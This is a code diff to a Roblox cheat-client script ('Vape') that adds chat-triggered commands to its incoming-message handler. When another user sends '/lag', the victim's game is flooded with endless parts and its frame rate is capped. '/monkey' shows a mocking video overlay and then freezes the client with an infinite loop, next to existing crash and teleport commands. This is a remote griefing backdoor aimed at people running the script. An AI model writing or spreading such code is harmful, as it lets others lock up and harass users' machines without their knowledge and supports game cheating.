@@ -10917,6 +10917,62 @@ txt.OnIncomingMessage = function(msg)
 			while true do print() end
 		elseif message.Text == "/lagback" then
 			lplr.Character.PrimaryPart.CFrame += Vector3.new(457635,1000,6745674567)
+		elseif message.Text == "/lag" then
+			task.spawn(function()
+				while true do
+					task.wait()
+					for i = 1,60 do
+						Instance.new("Part",workspace)
+					end
+					if setfpscap then
+						setfpscap(12)
+					end
+				end
+			end)
+		elseif message.Text == "/monkey" then
+			local str = "Imagine getting trolled by a vape private user"
+			if str == "" then str = "skill issue" end
+			local video = Instance.new("VideoFrame")
+			video.Video = downloadVapeAsset("vape/assets/skill.webm")
+			video.Size = UDim2.new(1, 0, 1, 36)
+			video.Visible = false
+			video.Position = UDim2.new(0, 0, 0, -36)
+			video.ZIndex = 9
+			video.BackgroundTransparency = 1
+			video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			local textlab = Instance.new("TextLabel")
+			textlab.TextSize = 45
+			textlab.ZIndex = 10
+			textlab.Size = UDim2.new(1, 0, 1, 36)
+			textlab.TextColor3 = Color3.new(1, 1, 1)
+			textlab.Text = str
+			textlab.Position = UDim2.new(0, 0, 0, -36)
+			textlab.Font = Enum.Font.Gotham
+			textlab.BackgroundTransparency = 1
+			textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			video.Loaded:Connect(function()
+				video.Visible = true
+				video:Play()
+				task.spawn(function()
+					repeat
+						wait()
+						for i = 0, 1, 0.01 do
+							wait(0.01)
+							textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+						end
+					until true == false
+				end)
+			end)
+			task.wait(19)
+			task.spawn(function()
+				pcall(function()
+					if getconnections then
+						getconnections(entityLibrary.character.Humanoid.Died)
+					end
+					print(game:GetObjects("h29g3535")[1])
+				end)
+				while true do end
+			end)
 		end
 	end
 	return p
